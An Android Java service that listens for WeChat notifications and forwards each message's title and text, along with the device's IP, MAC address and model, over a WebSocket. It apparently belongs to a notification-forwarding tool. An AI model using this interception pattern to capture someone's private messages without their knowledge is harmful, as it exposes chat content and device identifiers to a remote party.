package com.leither.service;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.leither.common.Tools;
import com.leither.network.SendNotificationWebSocket;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;

public class NotificationCaptureService extends NotificationListenerService {

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        Bundle notification = sbn.getNotification().extras;
        if (Objects.equals(sbn.getPackageName(), "com.tencent.mm") ) {
            notifyToClient(notification.getString(Notification.EXTRA_TITLE),
                    notification.getString(Notification.EXTRA_TEXT));
        }
    }

    private void notifyToClient(String title, String text){
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("ip", Tools.getWIFILocalIpAdress(getApplication()))
            .put("mac" , Tools.getWifiMac(getApplication()))
            .put("model", Tools.getDeviceName())
            .put("title", title)
            .put("text", text);
            SendNotificationWebSocket.getDefault().send(jsonObject.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
    }
}